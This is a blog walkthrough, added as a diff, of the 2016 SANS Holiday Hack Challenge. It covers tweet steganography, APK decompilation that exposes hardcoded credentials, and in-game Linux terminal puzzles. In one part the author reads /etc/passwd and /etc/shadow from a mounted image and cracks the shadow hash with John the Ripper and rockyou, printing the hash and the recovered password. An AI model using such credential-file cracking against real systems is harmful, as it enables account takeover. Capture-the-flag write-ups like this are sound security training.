@@ -1,0 +1,1530 @@
+<p>The great folks at SANS and CounterHack have brought us another adventure in the land of Josh and Jessica Dosis. This years challenge is called Santa’s Business Card. The game can be found <a href="http://holidayhackchallenge.com">here</a>. After saving the world from the nefarious plot of the ATNA Corporation last year, siblings Josh and Jessica find themselves in a pickle when Santa gets kidnapped from there house on Christmas Eve. All that is left is Santa’s business card. Its up to us to help the Dosis kids save Christmas (again…).</p>
+
+<!--more-->
+
+<h3 id="part-1-a-most-curious-business-card">Part 1: A Most Curious Business Card</h3>
+
+<p>As you can see below, Santa’s Business Card gives us a couple links to his social media profile (along with his middle initial, whoda thunk it!).</p>
+
+<p><img src="/assets/images/holidayhack2016/santas_business_card_logo.png" alt="Santa's Business Card" /></p>
+
+<p>We are asked a couple initial questions that this clue will lead us to the answers:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>And that, Dear Reader, is where you get involved. Take a close look at Santa's Business card. You can also inspect the crime scene by entering the Dosis home here. Based on your analysis, please answer the following questions:
+
+1) What is the secret message in Santa's tweets?
+
+2) What is inside the ZIP file distributed by Santa's team?
+</code></pre>
+</div>
+
+<p>First we will look at Santa’s <a href="https://twitter.com/SantaWClaus">twitter account</a>. Santa joined just this past November, and he was really busy for about 2 minutes on the 14th. He tweeted 350 times in those 2 minutes, about 3 tweets per minute. Here is a look at his first tweet from 6:45 AM.</p>
+
+<p><img src="/assets/images/holidayhack2016/first_tweet.png" alt="First Tweet" /></p>
+
+<p>Many Christmas like phrases can be seen in this message - words like joy, peace on earth, elf, Christmas, Santa, etc. The letters W (middle initial) and Q also appear. Scanning through all the tweets, this same type of message is repeated. Every once in a while, a string of periods and other punctuation marks can be found. Knowing that a secret message is hidden in the tweets, I suspect a potential encoding where maybe each Christmas word represents something special.</p>
+
+<p>The first task is to grab all the tweets so I can do some text parsing. I found a handy tool on Github called <code class="highlighter-rouge">tweet_dumper.py</code> (<a href="https://href.li/?https://gist.github.com/yanofsky/5436496">source</a>) from user yanofsky. This tool using the <code class="highlighter-rouge">tweepy</code> and <code class="highlighter-rouge">csv</code> libraries to create a CSV file of a users tweets. There are some limitations on how many it can grab, but 350 is well below that threshold. Creating an Twitter API key in order to automate the process, I pull down the tweets into a CSV file, ordered newest to oldest. The full output can be seen <a href="https://raw.githubusercontent.com/wcmoody/holidayhack/master/santawclaus_tweets.txt">here</a>. There is no decoding needed as the message is an ASCII art message. I threw together an ugly PIL script to visualize the message. With the following code</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+
+<span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">"RGB"</span><span class="p">,</span> <span class="p">(</span><span class="mi">350</span><span class="p">,</span><span class="mi">350</span><span class="p">),</span> <span class="s">"green"</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'santawclaus_tweets.txt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+
+<span class="n">tweets</span> <span class="o">=</span> <span class="p">[</span><span class="n">m</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">:]]</span>
+
+<span class="k">for</span> <span class="n">y</span><span class="p">,</span> <span class="n">tweet</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">tweets</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">tweet</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'.'</span><span class="p">:</span>
+            <span class="n">image</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">x</span><span class="o">+</span><span class="mi">130</span><span class="p">,</span><span class="n">y</span><span class="p">),</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+
+<span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">rotate</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span>
+<span class="n">image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">'tweet_img.png'</span><span class="p">)</span>
+</code></pre>
+</div>
+<p>The created image below reveals the message BUG BOUNTY</p>
+
+<p><img src="/assets/images/holidayhack2016/tweet_img.png" alt="Tweet Image" /></p>
+
+<p>Moving on to the Instagram account for <a href="https://www.instagram.com/santawclaus/">Santa W. Claus</a>, we see he was not nearly has active on this platform. Only three pictures are posted. The first is a very messy computer desk and the other two are seasonal pictures of a warm, cozy fireplace and some exterior Christmas lights. I decide to focus first on the messy desk.</p>
+
+<p>The first thing that jumps out to me is the excellent book, <a href="https://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579">Violent Python</a>, by my friend <a href="https://twitter.com/violentpython">TJ O’Connor</a> is on the desk. We also can see some SANS course materials for <a href="https://www.sans.org/course/python-for-pen-testers">SEC573</a>: Automating Information Security for Python. Garbage also litters the desk, we see a bag from Walmart and what I am pretty sure is a drink cup from <a href="http://www.baldinosofaugusta.com">Baldino’s Giant Jersey Subs</a>. Baldwin’s is located in August, GA and one of my favorite restaurants during my visits to Fort Gordon. Though not related to the puzzle, I am pretty sure this is the desk of <a href="https://twitter.com/markbaggett">Mark Baggett</a>, who is the course author of SEC 573, technical editor of TJ’s book, and president of the August GA ISSA chapter. (<strong>spoiler alert</strong>: credits of the game also reveal Mark is a contributor to the Holiday Hack Challenge!)</p>
+
+<p><img src="/assets/images/holidayhack2016/ig1.jpeg" alt="Instagram Picture 1" /></p>
+
+<p>But to the real task at hand, we apparently need to find a ZIP file. The computer on the desk has the NORAD Santa Tracker visible in a web-browser. Looking through this site real quickly, a draw the conclusion that they probably have not be coerced into playing along with this game. But zooming in on that website, you can see another window behind it with the following text visible.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>ath .\ DestinationPath SantaGram_v4.2.zip
+</code></pre>
+</div>
+
+<p>I quickly attempt to throw this file name on the web root of the holiday hack challenge website, but <code class="highlighter-rouge">404</code>. But looking closer back at the copy of Violent Python, I see a print out from an nmap scan of <code class="highlighter-rouge">www.northpolewonderland.com</code>. The root of this website is Santa’s business card, so its looks promising. Appending the zip file name to the end of the domain name results in the download of a file!</p>
+
+<p>The <code class="highlighter-rouge">ls</code> and <code class="highlighter-rouge">file</code> programs provide us some details on the file.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>ls SantaGram_v4.2.zip
+SantaGram_v4.2.zip
+<span class="gp">$ </span>file SantaGram_v4.2.zip
+SantaGram_v4.2.zip: Zip archive data, at least v2.0 to extract
+</code></pre>
+</div>
+
+<p>With unzip we extract the file which is password protected. Trying the message from the twitter account (<code class="highlighter-rouge">bugbounty</code> - no space)  we unlock the contents to reveal an Android application package file (<code class="highlighter-rouge">.apk</code>).</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>unzip SantaGram_v4.2.zip
+Archive: SantaGram_v4.2.zip
+<span class="o">[</span>SantaGram_v4.2.zip] SantaGram_4.2.apk password:
+inflating: SantaGram_4.2.apk
+</code></pre>
+</div>
+
+<h4 id="so-the-answers-to-the-questions-for-part-one">So the answers to the questions for part one…</h4>
+
+<ul>
+  <li>A1: The secret message hidden in Santa’s tweets is BUG BOUNTY. This is the password to the zip file hosted at <a href="http://www.northpolewonderland.com/SantaGram_v4.2.zip">http://www.northpolewonderland.com/SantaGram_v4.2.zip</a></li>
+  <li>A2: Inside the ZIP file distributed by Santa’s team, is an Android application package called SantaGram_4.2. Obviously, Santa and the team are working on a new social media mobile app.</li>
+</ul>
+
+<h3 id="part-2-awesome-package-konveyance">Part 2: Awesome Package Konveyance</h3>
+
+<p><img src="/assets/images/holidayhack2016/dosis_living_room.png" alt="Living Room" /></p>
+
+<p>We now enter the game world of the Dosis home. We find Josh and Jessica as we left them last year (maybe a pixel or two taller!). We see the business card, a destroyed Christmas tree, and Santa’s bag with a glittering opening. Entering the bag, we are transported to the North Pole.</p>
+
+<p>This 8-bit wonderland is even better than last years environment. We are able to explore all around the north pole meeting other players, non-player characters, and even some real CounterHack personalities (like the Real Ed Skoudis.)</p>
+
+<p>For Part 2, we have to answer the following questions about the APK file found in the zip file from Part 1.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Again, Dear Reader, you are called upon to help the children in their analysis as you answer the following questions. If you get stuck, feel free to explore the North Pole and interact with Santa's friendly and helpful elves, who are available to give you hints.
+
+3) What username and password are embedded in the APK file?
+
+4) What is the name of the audible component (audio file) in the SantaGram APK file?
+</code></pre>
+</div>
+
+<p>Lots of friendly elves around the North Pole with some pointers on APK forensics work.</p>
+
+<p><img src="/assets/images/holidayhack2016/shinny_upatree.png" alt="Shinny Upatree" /></p>
+
+<p><strong>Shinny Upatree</strong> (inside workshop near the train) recommends just unzipping the APK file and using the <code class="highlighter-rouge">JadX</code> tool, which can dissemble the .dex file back to Java source code. The elf provides a link to Josh Wright’s <a href="http://www.willhackforsushi.com/presentations/gitd-hackfest.pptx">presentation</a> from Hackfest 2016. He/she also recommends using <code class="highlighter-rouge">Android Studio</code> to help make sense of obfuscated source code.</p>
+
+<p><img src="/assets/images/holidayhack2016/bushy_evergreen.png" alt="Bushy Evergreen" /></p>
+
+<p><strong>Bushy Evergreen</strong> (outside of the workshop) recommends <code class="highlighter-rouge">apktool</code> (<a href="https://ibotpeaches.github.io/Apktool/">available here</a>) and provides a link to video by Josh Wright on <em>Manipulating Android Applications</em> <a href="https://www.youtube.com/watch?v=mo2yZVRicW0">video</a>. This tool allows us to decompile the APK file into smali files, which is a low-language assembly-like language for the dalvik, Android’s Java VM implementation. This tool is more powerful that unzipping and recovering Java source code, as we can edit the smali files and recompile, sign, and redeploy into a Android SDK environment. Though not needed in this part of the challenge, this lesson may turn out to be helpful in the future.</p>
+
+<p>After collecting up all these recommendations, its time to set out and try to answer the questions. For Java decompilation (Android and other Java applications), I tend to use an online <a href="http://www.javadecompilers.com/apk">Java/APK decompiler</a>, that is just a front-end for JadX.  I do not recommend online decompilation tools for private files, but since the challenge is open to the public there is no harm uploading these files back online.</p>
+
+<p>For a quick search, I like to use <code class="highlighter-rouge">grep</code> since the more time I spend in front of a command prompt, the more elite I feel. During a recursive grep though the folder of the decompiled APK file, I get a solid hit on question 4 and plenty of hits on question 3.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep -r mp3 <span class="k">*</span>
+original/META-INF/CERT.SF:Name: res/raw/discombobulatedaudio1.mp3
+original/META-INF/MANIFEST.MF:Name: res/raw/discombobulatedaudio1.mp3
+
+<span class="gp">$ </span>find . -name <span class="s2">"*.mp3"</span>
+./res/raw/discombobulatedaudio1.mp3
+
+<span class="gp">$ </span>grep -r password <span class="k">*</span> | wc -l
+23
+<span class="gp">$ </span>grep -r username <span class="k">*</span> | wc -l
+21
+</code></pre>
+</div>
+
+<p>Assuming we need to dive into the actual Santagram Java files, I am going to restrict my search to the <code class="highlighter-rouge">com/northpolewonderland/santagram</code> folder. I will use some command line kungfu to find the lines that contain both <em>username</em> and <em>password</em>.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep password <span class="k">*</span>.java | cut -d<span class="s1">' '</span> -f1 | sort | uniq
+C0987b.java:
+Login.java:
+SignUp.java:
+SplashScreen.java:
+
+<span class="gp">$ </span>grep username <span class="k">*</span>.java | cut -d<span class="s1">' '</span> -f1 | sort | uniq
+C0987b.java:
+Configs.java:
+SignUp.java:
+SplashScreen.java:
+</code></pre>
+</div>
+
+<p>Going through each file one at a time, we see that <code class="highlighter-rouge">SplashScreen.java</code> contains the username of <code class="highlighter-rouge">guest</code> and password of <code class="highlighter-rouge">busyreindeer78</code>.</p>
+
+<p>Specifically in the following block of code that runs from lines 120 - 125</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">postDeviceAnalyticsData</span><span class="o">()</span> <span class="o">{</span>
+    <span class="n">JSONObject</span> <span class="n">jSONObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"username"</span><span class="o">,</span> <span class="s">"guest"</span><span class="o">);</span>
+        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="s">"busyreindeer78"</span><span class="o">);</span>
+        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"type"</span><span class="o">,</span> <span class="s">"launch"</span><span class="o">);</span>
+</code></pre>
+</div>
+
+<h4 id="so-the-answers-to-the-questions-for-part-two-are-">So the answers to the questions for part two are …</h4>
+
+<ul>
+  <li>A3: The username and password in the APK are guest and busyreindeer78. They can be found (amongst other places) in SplashScreen.java.</li>
+  <li>A4: The name of the audio file is discombobulatedaudio1.mp3 and can be found in the <code class="highlighter-rouge">res/raw</code> directory and mentioned in the <code class="highlighter-rouge">CERT.SF</code> and <code class="highlighter-rouge">MANIFEST.MF</code> files.</li>
+</ul>
+
+<h3 id="part-3-a-fresh-baked-holiday-pi">Part 3: A Fresh-Baked Holiday Pi</h3>
+
+<p>The Dosis siblings have done all they can with their phones and need some more computing power. Apparently there is a small computer called a Cranberry Pi whose pieces are scattered about the North Pole. Additionally there are a few doors around the North Pole that have access panels that can only be accessed and opened with a functional Cranberry Pi. Our specific guidance for this part is as follows:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Now, Dear Reader, scurry around the North Pole and retrieve all of the computer parts to build yourself a Cranberry Pi. Once your Pi is fully operational, please help the Dosis children find and rescue Santa, answering the following questions:
+
+5) What is the password for the "cranpi" account on the Cranberry Pi system?
+
+6) How did you open each terminal door and where had the villain imprisoned Santa?
+</code></pre>
+</div>
+
+<p>This part has multiple sub parts, so lets work on assembling the Cranberry Pi first.</p>
+
+<h4 id="build-a-cranberry-pi">Build a Cranberry Pi</h4>
+
+<p>There five parts needed to be found from around the North Pole.</p>
+
+<p>The <strong>Cranberry Pi Board</strong> can be found in a secret room behind the unlit fireplace in Elf House #1. After you cross the bridge from the train station in the south, turn left and enter the second house. Once you enter you will see <strong>Sugarplum Mary</strong>. Just walk right through the fireplace.</p>
+
+<p><img src="/assets/images/holidayhack2016/cranpi_board.png" alt="Cranpi Board" /></p>
+
+<p>The <strong>Heat Sink</strong> can be found in the upstair storage room Elf House #2.This house is located to the right when you cross the bridge. Its the first house. Head up the stairs in the top right corner, and heat sink awaits you.</p>
+
+<p><img src="/assets/images/holidayhack2016/cranp_heatsink.png" alt="Cranpi Heatsink" /></p>
+
+<p>The <strong>Power Cord</strong> is located outside behind the snowman. This is just to the east of the “Days since the last Grinch level event.” and to the south of the large tree with the ladder to the NetWars Experience.</p>
+
+<p><img src="/assets/images/holidayhack2016/cranpi_powercord.png" alt="Cranpi Powercord" /></p>
+
+<p>To reach the last two items, you must reach the workshop at the most northern part of the North Pole. Climb the ladder on the tree trunk, enter the NetWars Experience, and exit to the east where a very dark platform can be seen. Once you are back outside, follow the path until you reach the ladder going up into the canopy and the clouds. When you emerge from the clouds you will be outside Santa’s workshop. Don’t enter just yet, head left out onto the plank and retrieve the <strong>SD Card</strong>.</p>
+
+<p><img src="/assets/images/holidayhack2016/cranpi_sdcard.png" alt="Cranpi SD Card" /></p>
+
+<p>Our final piece of the Cranberry Pi can be found inside the workshop in the reindeer holding area. Head into the main door, go around the barrels and down to the lower platform to the west of where you enter. In the northwest corner you will find three reindeer and the <strong>HDMI Cable</strong> behind the first one.</p>
+
+<p><img src="/assets/images/holidayhack2016/cranpi_hdmi.png" alt="Cranpi HDMI" /></p>
+
+<p>You now have all 5 parts of the Cranberry Pi. You can view the items in your inventory by clicking the backpack icon in the bottom right corner or pressing the I key.</p>
+
+<p><img src="/assets/images/holidayhack2016/cranpi_fullinventory.png" alt="Full Inventory" /></p>
+
+<p>Once you have all the parts, go talk to <strong>Holly Evergreen</strong> at the entrance to the North Poll. Holly will inform you that you need one more element before you can use the Cranberry Pi to access the door panels. You must download the <code class="highlighter-rouge">Cranbian</code> image from Holly and recover the password for the <code class="highlighter-rouge">cranpi</code> account. Santa is the only one who knows the password, but he’s been kidnapped (as you probably already know.)</p>
+
+<p><img src="/assets/images/holidayhack2016/cranpi_holly_evergreen.png" alt="Holly Evergreen" /></p>
+
+<p>The Cranbian image can be downloaded from <a href="https://www.northpolewonderland.com/cranbian.img.zip">here</a>. Once you download the zipped IMG file, you need to find the elf Wunorse Openslae just north of the bridge. He provides a link to a article about how to deal with multiple SD cards for Raspberry Pi images. I bet this will be helpful.</p>
+
+<p><img src="/assets/images/holidayhack2016/wunorse_openslae.png" alt="Wunorse Openslae" /></p>
+
+<p>Following along with the blog entry, I copy the extracted IMG file into my Ubuntu Precise64 Vagrant VM (since I hack mainly on a MacBook and iMac).</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">vagrant@precise64:~$ </span>fdisk -l cranbian-jessie.img
+
+Disk cranbian-jessie.img: 1389 MB, 1389363200 bytes
+255 heads, 63 sectors/track, 168 cylinders, total 2713600 sectors
+Units <span class="o">=</span> sectors of 1 <span class="k">*</span> 512 <span class="o">=</span> 512 bytes
+Sector size <span class="o">(</span>logical/physical<span class="o">)</span>: 512 bytes / 512 bytes
+I/O size <span class="o">(</span>minimum/optimal<span class="o">)</span>: 512 bytes / 512 bytes
+Disk identifier: 0x5a7089a1
+
+Device Boot Start End Blocks Id System
+cranbian-jessie.img1 8192 137215 64512 c W95 FAT32 <span class="o">(</span>LBA<span class="o">)</span>
+cranbian-jessie.img2 137216 2713599 1288192 83 Linux
+</code></pre>
+</div>
+
+<p>This give us the sector size and the number of sectors to the beginning of the <code class="highlighter-rouge">ext4</code> partition. Thus we can calculate the offset for the file system as 70,254,592 bytes. Next step is to create a directory and mount the ext4 partition at that mount point.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">vagrant@precise64:~$ </span>mkdir cranbian
+<span class="gp">vagrant@precise64:~$ </span>sudo mount -v -o <span class="nv">offset</span><span class="o">=</span>70254592 -t ext4 cranbian-jessie.img cranbian
+mount: enabling autoclear loopdev flag
+mount: going to use the loop device /dev/loop0
+/home/vagrant/cranbian-jessie.img on /home/vagrant/cranbian <span class="nb">type </span>ext4 <span class="o">(</span>rw,offset<span class="o">=</span>70254592<span class="o">)</span>
+<span class="gp">vagrant@precise64:~$ </span>ls -l cranbian/
+total 92
+drwxr-xr-x 2  root    root  4096   Nov 23 15:11    bin
+drwxr-xr-x 2  root    root  4096   Sep 23 03:52    boot
+drwxr-xr-x 4  root    root  4096   Sep 23 02:23    dev
+drwxr-xr-x 77 root    root  4096   Dec  5 16:25    etc
+drwxr-xr-x 3  root    root  4096   Nov 21 15:25    home
+drwxr-xr-x 17 root    root  4096   Nov 23 15:07    lib
+drwx------ 2  vagrant root 16384   Sep 23 03:52    lost+found
+drwxr-xr-x 2  root    root  4096   Sep 23 02:20    media
+drwxr-xr-x 2  root    root  4096   Sep 23 02:20    mnt
+drwxr-xr-x 3  root    root  4096   Sep 23 02:27    opt
+drwxr-xr-x 2  root    root  4096   Jan  7 2015     proc
+drwx------ 2  root    root  4096   Nov 23 15:14    root
+drwxr-xr-x 5  root    root  4096   Sep 23 02:28    run
+drwxr-xr-x 2  root    root  4096   Sep 23 02:39    sbin
+drwxr-xr-x 2  root    root  4096   Sep 23 02:20    srv
+drwxr-xr-x 2  root    root  4096   Apr 12 2015     sys
+-rw-r--r-- 1  root    root    12   Dec 15 03:12    <span class="nb">test
+</span>drwxrwxrwt 7  root    root  4096   Nov 17 20:17    tmp
+drwxr-xr-x 10 root    root  4096   Sep 23 02:20    usr
+drwxr-xr-x 11 root    root  4096   Nov 23 15:10    var
+</code></pre>
+</div>
+
+<p>We can see we have the entire file system for the Cranbian image.  Another friendly elf in the North Pole recommends a good way to crack passwords. Minty Candycane can be found in the Small Tree House right outside of the NetWars Experience. She recommends John the Ripper for password cracking. She also mentions the rockyou password list that can be found here.</p>
+
+<p><img src="/assets/images/holidayhack2016/minty_candycane.png" alt="Minty Candycane" /></p>
+
+<p>You can find some good example of how to use john on the inter-webs. Since I mounted the Cranbian image on a VM in which I have root, I am able to view the /etc/passwd and /etc/shadow files. The following cracks the password for the cranpi account wide open…</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">vagrant@precise64:~$ </span>unshadow cranbian/etc/passwd cranbian/etc/shadow &gt; mypasswd
+
+<span class="gp">vagrant@precise64:~$ </span>tail -1 mypasswd
+
+cranpi:<span class="nv">$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY</span>/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:1000:1000:,,,:/home/cranpi:/bin/bash
+
+<span class="gp">vagrant@precise64:~$ </span>ln -s rockyou.txt /usr/share/john/passwd.lst
+
+<span class="gp">vagrant@precise64:~$ </span>john mypasswd
+
+<span class="gp">vagrant@precise64:~$ </span>tail -5 .john/john.log
+
+0:00:00:02 - Wordlist file: /usr/share/john/password.lst
+0:00:00:02 - 57 preprocessed word mangling rules
+0:00:00:02 - Rule <span class="c">#1: ':' accepted as ''</span>
+0:00:19:36 + Cracked cranpi
+0:00:19:36 Session completed
+
+<span class="gp">vagrant@precise64:~$ </span>tail -1 .john/john.pot
+
+<span class="nv">$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY</span>/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:yummycookies
+
+<span class="gp">vagrant@precise64:~$ </span>tail -1 .john/john.pot | cut -d<span class="s2">":"</span> -f2
+yummycookies
+</code></pre>
+</div>
+
+<p>Now that we have the password to the cranpi account, we can return to Holly Evergreen and give her the help she needs. Once we give her the password, our Cranberry Pi becomes operational and we can return to the door access panel spread throughout the North Pole.</p>
+
+<h4 id="open-all-the-terminal-doors-throughout-the-north-pole">Open all the Terminal Doors throughout the North Pole</h4>
+
+<p>The terminal doors were a nice way of adding some actual hacking inside the game environment. Last year, you played in the game world but only to unlock achievements, retrieve files and get some hints from SANS / CounterHack personalities. I really liked this addition and they were critical to answer all of the questions in the second half of Part 3.</p>
+
+<p>The doors are marked with a little cranberry icon but during December they were hard to see because of the crowd of players at each panel. Another way to know a panel was near by was trying to access a door and seeing the password panel below. Once you access the panel with your Cranberry Pi, you are presented with a pop up terminal window in a very limited Linux environment.</p>
+
+<p><img src="/assets/images/holidayhack2016/panel_lcd.png" alt="Panel LCD" /></p>
+
+<p>The first door can be found inside of elf house #1. This is the same house in which we found the Heat Sink upstairs.</p>
+
+<p><img src="/assets/images/holidayhack2016/elfhouse_1_panel.png" alt="Elfhouse Panel 1" /></p>
+
+<p>The panel prompts us to recover the two parts of the passphrase from the file <code class="highlighter-rouge">/out.pcap</code>. The first thing to do is check the permissions on the file. We see that the owner is <code class="highlighter-rouge">itchy</code> and we are logged in as <code class="highlighter-rouge">scratchy</code>. This is reference a cat and a mouse characters from a show inside the show of <em>The Simpsons</em>. Add these to our list of potential perpetrators. Itchy is the only user that can read the packet capture file. The Linux <code class="highlighter-rouge">sudo</code> utility allows us to execute commands as other users. Traditionally this is used for root level actions if so permitted. But it requires the current user to provide their password. We do not know the scratchy password (or at least we do not know we know it). So this does not help. We can run the sudo command with the <code class="highlighter-rouge">-l</code> to list the allowed and disallowed commands. The excerpt from the man page for sudo explains:</p>
+
+<blockquote>
+  <blockquote>
+    <p>If no command is specified, the -l (list) option will list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.</p>
+  </blockquote>
+</blockquote>
+
+<p>With this knowledge, we can check if we have any special permissions on this box. As you can see below, we can in fact run two programs as itchy without a password (score!). To execute a command as another user with <code class="highlighter-rouge">sudo</code>, we would use the <code class="highlighter-rouge">-u</code> argument.</p>
+
+<p><img src="/assets/images/holidayhack2016/itchy_panel_1.png" alt="Itchy Panel 1" /></p>
+
+<p>The <code class="highlighter-rouge">strings</code> program allows us to see all instances of 4 or more printable characters. This tool is great for finding valuable information from binaries, images, or other media. The <code class="highlighter-rouge">tcpdump</code> program is traditionally used to capture network traffic to generate PCAP files, but it also can be used to examine an existing PCAP.</p>
+
+<p>First we will use the handy strings program on our PCAP. Piping the output to word count (<code class="highlighter-rouge">wc</code>) we see we have over 13,000 lines of strings. The program <code class="highlighter-rouge">head</code> allows us to see the first ten line. It appears we have some web traffic from <code class="highlighter-rouge">wget</code> for a file named <code class="highlighter-rouge">firsthalf.html</code>.  Let’s see if any credentials were passed in the clear. We are looking for a passphrase or password so we will grep the strings output for that. No hits for either <em>pass</em> or <em>user</em>. Since we are looking for parts of a pass phrase, I will try the search for the word <em>part</em>. Boom! there it is. A hidden field on a html form labeled <code class="highlighter-rouge">part1</code> with a value of <code class="highlighter-rouge">santasli</code> You can see the terminal commands and outputs below.</p>
+
+<p><img src="/assets/images/holidayhack2016/itchy_panel_2.png" alt="Itchy Panel 2" /></p>
+
+<p>For the second part, I guess we have to use tcpdump. The <code class="highlighter-rouge">-r</code> argument will allow us to use a patch capture as the read input file to the program. By default, we will get the packet headers consisting of the source and destination IP address and ports along with some other data about the connections. To see the content of the packet capture, we can use the <code class="highlighter-rouge">-X</code> or <code class="highlighter-rouge">-A</code> flag (hex or ascii output) along with a snap length of 0 (meaning all data).  Looking through the dump we see the http retrival of the file <code class="highlighter-rouge">secondhalf.bin</code>. This request comes from IP:PORT address <code class="highlighter-rouge">192.168.188.1:52103</code>, so I will refine my <code class="highlighter-rouge">tcpdump</code> command to only look at traffic that is returning to this socket with the destination port argument. Again using <code class="highlighter-rouge">grep</code>, we can see there were 179 packets needed to return this file.</p>
+
+<p><img src="/assets/images/holidayhack2016/itchy_panel_3.png" alt="Itchy Panel 3" /></p>
+
+<p>Further examination of the data with <code class="highlighter-rouge">-X</code> and <code class="highlighter-rouge">-A</code> reveal there is 65,000+ lines of hexadecimal output and 4500+ lines of ascii output. With limited tools on this box (no <code class="highlighter-rouge">python</code> and no <code class="highlighter-rouge">less</code>) and no way to exfiltrate a file from this system, I decide to guess the second half. My first guess is successful! Sticking to the theme of <em>The Simpson</em>, I guess the name of the family dog, <strong>Santa’s Little Helper</strong>.</p>
+
+<p><strong>FULL DISCLOSURE:</strong> A few days after guessing this password, I was reading the reddit on the Holiday Hack Challenge, and <em>Jeff McJunkin</em> gave a great hint on this. He said:</p>
+
+<blockquote>
+  <blockquote>
+    <p>What types of strings does the strings utility look for, by default? #hint</p>
+  </blockquote>
+</blockquote>
+
+<p>Heading back to the <code class="highlighter-rouge">man</code> page for <code class="highlighter-rouge">strings</code>, I see the <code class="highlighter-rouge">-e</code> option allows you to change the encoding. Cycling through the choices, I get a hit on 16-bit littleendian <code class="highlighter-rouge">-l</code>. Still interested to know the binary does. Many people tried to pull it off the terminal. Heard someone did the entire PCAP via base64 and copy and paste…. smh</p>
+
+<p><img src="/assets/images/holidayhack2016/itchy_panel_4.png" alt="Itchy Panel 4" /></p>
+
+<p>The new room reveals another elf with some JSON hints for later. But also one of my favorite Easter eggs, The <em>Rogue One</em> movie poster on the wall (more on that later.)</p>
+
+<p><img src="/assets/images/holidayhack2016/rogue_one.png" alt="Rogue One Poster" /></p>
+
+<p>The next three doors are all located in Santa’s workshop at the most northern portion of the North Pole. There is one near the reindeer pen, one at the top of the winding staircase, and one on the train in the eastern wing.</p>
+
+<p><img src="/assets/images/holidayhack2016/stable_door_wumpus.png" alt="Stable Door Panel" /></p>
+
+<p>Going to the panel near the reindeer pen, we are presented with the instructions to recovery the passphrase from the wumpus. We further are told we can cheat or not. Looking in the home directory of our user elf, we see one file. The program wumpus is world executable. We do not have the program file or hexdump, but we can cat the executable and pipe to head to see this is an 64-bit ELF file (punny).</p>
+
+<p><img src="/assets/images/holidayhack2016/wumpus_intro.png" alt="Wumpus Intro" /></p>
+
+<p>The program is a version of Hunt the Wumpus in which you navigate a labyrinth of rooms to try and kill the wumpus. You start with 5 arrows and have to shoot and move, avoiding a bat until you kill the wumpus. Once you smell the creature, you fire an arrow into each of the adjoining rooms. Once you die, you can start back over in the same random game board. I could not figure out how to cheat, but I did win. As you can see below, the passphrase is <code class="highlighter-rouge">WUMPUS IS MISUNDERSTOOD</code></p>
+
+<p><img src="/assets/images/holidayhack2016/wumpus_victory.png" alt="Wumpus Victory" /></p>
+
+<p>Using the passphrase, we enter into another section of the reindeer pen with a few additional reindeer. There does not appear to be anything interesting here at this TIME.</p>
+
+<p><img src="/assets/images/holidayhack2016/workshop_door_directory.png" alt="Workshop Door" /></p>
+
